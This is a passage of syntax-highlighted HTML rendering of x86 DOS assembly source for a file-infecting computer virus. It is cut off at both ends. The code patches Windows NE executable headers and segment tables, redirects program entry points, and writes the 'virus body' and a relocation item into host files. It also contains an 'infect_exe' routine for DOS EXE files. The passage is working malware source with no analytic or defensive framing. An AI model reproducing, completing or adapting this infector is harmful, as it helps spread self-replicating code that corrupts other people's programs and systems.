                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; start of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">
                                                </span><span class="sc1">; leave the marker</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; so we wouldn't waste</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; time once again</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; write header</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_and_finish</span><span class="sc0">

</span><span class="sc5">ok_newexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; change the segment table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_firsta</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">no_firsta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc5">pnt_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; change where needed</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_8_add</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">no_8_add</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">pnt_check</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">37h</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; kill gangload area</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ah</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; so all NewEXEs will work</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; NE size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winexe_entry</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; put new ip and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; store old ip</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; put new cs and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; store old cs</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">32h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; segment align</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; newexe offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">move_header_fwd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ne header size</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">last_page</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; where to go</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile_mid_cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; to next chunk</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile_mid_cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                          </span><span class="sc1">; read it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">move_header_fwd</span><span class="sc0">

</span><span class="sc5">last_page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; segment align</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; shift segment offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; by segment align</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_extra</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_extra</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_ne</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; segment offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">virus_lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">180h</span><span class="sc0">            </span><span class="sc1">; Segment attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc5">virus_lenght</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; where to go</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile_mid_cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; write last chunk</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">winip</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">; reset reloc pointer</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">wincs</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">9h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; end of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile_mid_cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; write virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_lenght</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">wincs</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; restore reloc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">winip</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; pointer</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; write reloc item</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocitem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocitem_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocitem</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_and_finish</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">        </span><span class="sc1">; AX:DX = lenght</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; check _really_ no overlays</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                  </span><span class="sc1">; compare lenght calculated</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; from header with the real</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; lenght we got from lseek</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exit_exe_infection</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exit_exe_infection</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                          </span><span class="sc1">; calculate new</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; cs:ip for exe</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">

